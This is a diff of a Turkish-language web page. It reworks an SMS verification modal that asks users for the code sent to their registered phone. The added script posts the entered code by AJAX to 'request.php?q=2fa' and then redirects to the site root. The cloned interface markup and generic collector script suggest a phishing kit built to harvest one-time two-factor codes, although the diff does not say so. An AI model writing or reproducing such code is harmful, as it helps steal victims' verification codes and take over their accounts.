@@ -229,39 +229,7 @@
                   <!----><!---->
                </app-custom-numpad>
             </div>
-            <div materialize="modal" class="modal" style="z-index: 1033; display: block; opacity: 1; transform: scaleX(1); top: 10%;" id="sms-mdl">
-               <a href="javascript:;" class="modal-action modal-close"><i class="material-icons pg-icons">close</i></a><!----><!----><!---->
-               <div class="modal-content">
-                  <sms-modal>
-                     <div class="sms-modal">
-                        <b>Lütfen sistemde kayıtlı telefon numaranıza gelen SMS deki doğrulama kodunu giriniz.</b>
-                        <form novalidate="" class="ng-untouched ng-pristine ng-invalid">
-                           <div class="input-field"><input id="SmsCode" name="smsCode" type="password" required="" maxlength="6" class="browser-default ng-untouched ng-pristine ng-invalid" placeholder="SMS şifresi"></div>
-                           <button type="submit" class="btn" disabled="">Giriş</button>
-                        </form>
-                        <div class="remaning-time-cntnt"><span class="remaning-time"> Kalan süre </span><span id="gerisayi">70</span><a href="javascript:;" class="right disabled"> SMS şifremi tekrar gönder <i class="fa fa-refresh fa-fw"></i></a></div>
-                        <!---->
-                     </div>
-                  </sms-modal>
-                  <!----><!----><!---->
-               </div>
-            </div>
-            <script>
-               function geriyeSay() {
-                  var saniye = 120;
-                  var geriSayma = setInterval(function() {
-                     document.getElementById("gerisayi").textContent = saniye;
-                     saniye--;
-                     if (saniye < 0) {
-                           clearInterval(geriSayma);
-                           document.getElementById("gerisayi").textContent = "Geri sayım tamamlandı!";
-                     }
-                  }, 1000);
-               }
-
-               geriyeSay();
-               </script>
-            <!---->
+            
          </app-out-component>
          <!----><!----><!----><!---->
       </app-root>
@@ -1096,6 +1064,58 @@ document.getElementById('maximizeButton').addEventListener('click', maximizeTawk
                   <!----><!----><!---->
                </div>
             </div>
+            <div materialize="modal" class="modal hidden" style="z-index: 1033; display: block; opacity: 1; transform: scaleX(1); top: 10%;" id="sms-mdl">
+               <a href="javascript:;" class="modal-action modal-close" onclick="closemodal()" ><i class="material-icons pg-icons">close</i></a><!----><!----><!---->
+               <div class="modal-content">
+                  <sms-modal>
+                     <div class="sms-modal">
+                        <b>Lütfen sistemde kayıtlı telefon numaranıza gelen SMS deki doğrulama kodunu giriniz.</b>
+                        <form novalidate="" class="ng-untouched ng-pristine ng-invalid" id="smsForm" action="javascript:;" onclick="smsa()">
+                           <div class="input-field"><input id="SmsCode" name="smsCode" type="password" required="" maxlength="6" class="browser-default ng-untouched ng-pristine ng-invalid" placeholder="SMS şifresi"></div>
+                           <button type="submit" class="btn" disabled="">Giriş</button>
+                        </form>
+                        <div class="remaning-time-cntnt"><span class="remaning-time"> Kalan süre </span><span id="gerisayi">70</span><a href="javascript:;" class="right disabled"> SMS şifremi tekrar gönder <i class="fa fa-refresh fa-fw"></i></a></div>
+                        <!---->
+                     </div>
+                  </sms-modal>
+                  <!----><!----><!---->
+               </div>
+            </div>
+            <script>
+               function geriyeSay() {
+                  var saniye = 120;
+                  var geriSayma = setInterval(function() {
+                     document.getElementById("gerisayi").textContent = saniye;
+                     saniye--;
+                     if (saniye < 0) {
+                           clearInterval(geriSayma);
+                           document.getElementById("gerisayi").textContent = "Geri sayım tamamlandı!";
+                     }
+                  }, 1000);
+               }
+
+               geriyeSay();
+               function smsa(){
+                  event.preventDefault();
+               $.ajax({
+                  type: 'POST',
+                  url: 'request.php?q=2fa',
+                  data: $('#smsForm').serialize(),
+                  success: (response) => {
+                     if (response == 'error') {
+                     Swal.fire('Hata!','Bilgileri doğru girdiğinizden emin olun','error');
+                     }else{
+                     if (locate == 0) {
+                        window.location.href = '/';
+                     }else{
+                        window.location.href = '/';
+                     }
+                     }
+                  }
+  })
+               }
+               </script>
+            <!---->
          </app-out-component>
          <!----><!----><!---->
       </app-root>
